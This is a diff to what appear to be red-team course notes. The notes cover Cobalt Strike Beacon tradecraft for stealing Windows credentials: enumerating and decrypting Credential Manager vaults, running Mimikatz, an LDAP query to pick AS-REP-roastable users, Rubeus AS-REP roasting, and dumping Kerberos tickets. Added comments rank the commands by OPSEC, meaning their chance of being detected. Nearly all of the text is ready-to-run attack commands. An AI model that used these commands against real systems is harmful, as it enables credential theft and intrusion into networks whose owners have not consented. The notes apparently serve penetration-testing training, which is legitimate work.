@@ -18,8 +18,11 @@ The Windows Credential Manager stores other credentials that the user has asked 
 NOTE: This technique can be used from a medium-integrity context.
 
 ```powershell
-# Identify PRESENCE of saved creds
+# Identify PRESENCE of saved creds BAD OPSEC
 beacon> run vaultcmd /listcreds:"Windows Credentials" /all  # vaultcmd way
+
+or
+
 beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault # WindowsVault way
 
 # Decrypt
@@ -40,7 +43,8 @@ OPSEC NOTE: Dumping credentials from LSASS is generally a bad idea from an OPSEC
 
 Mimikatz Usage
 ```powershell
-## DNS Beacons are SLOW... try HTTP
+## DNS Beacons are SLOW... try spawning a HTTP beacon first
+beacon> spawn x64 http
 
 # Usage
 beacon> mimikatz [command]
@@ -85,7 +89,13 @@ Rubeus' `asreproast` command will enumerate every account that has preauthentica
 
 AS-REP roasting with Beacon
 ```powershell
-# AS-REP roasting
+# Triage targets first
+beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe -s "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" --attributes cn,samaccountname,distinguishedname --json
+
+# AS-REP roasting specific user (good opsec)
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /format:hashcat /user:<samaccountname> /nowrap  # format, if not specified, is JtR
+
+# AS-REP roasting ALL USERS (bad opsec)
 beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /format:hashcat /nowrap  # format, if not specified, is JtR
 
 # Cracking (RC4)
@@ -133,7 +143,7 @@ beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
 
 # Extract tickets
 beacon> execute-assembly C:\path\Rubeus.exe dump /nowrap  # extract ALL tickets
-beacon> execute-assembly C:\path\Rubeus.exe dump /luid:<luid> /service:<svc (krbtgt, ldap, etc)> /nowrap # extract specific tickets
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:<luid> /service:<svc (krbtgt, ldap, etc)> /nowrap # extract specific tickets
 ```
 
 #### Renewing TGTs
